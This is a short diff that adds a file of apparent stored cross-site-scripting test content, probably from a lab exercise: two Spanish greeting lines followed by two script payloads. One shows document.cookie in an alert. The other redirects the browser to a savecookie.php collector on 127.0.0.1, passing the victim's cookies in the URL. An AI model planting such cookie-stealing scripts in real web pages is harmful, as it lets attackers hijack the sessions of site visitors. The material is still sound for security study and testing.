@@ -1,0 +1,9 @@
+
+hola amigos<hr/>
+que tal<hr/>
+<script type="text/javascript">
+	alert(document.cookie);
+</script><hr/>
+<script type="text/javascript">
+	window.location='http://127.0.0.1/scfinal/xss/savecookie.php?cookies='+document.cookie;
+</script><hr/>
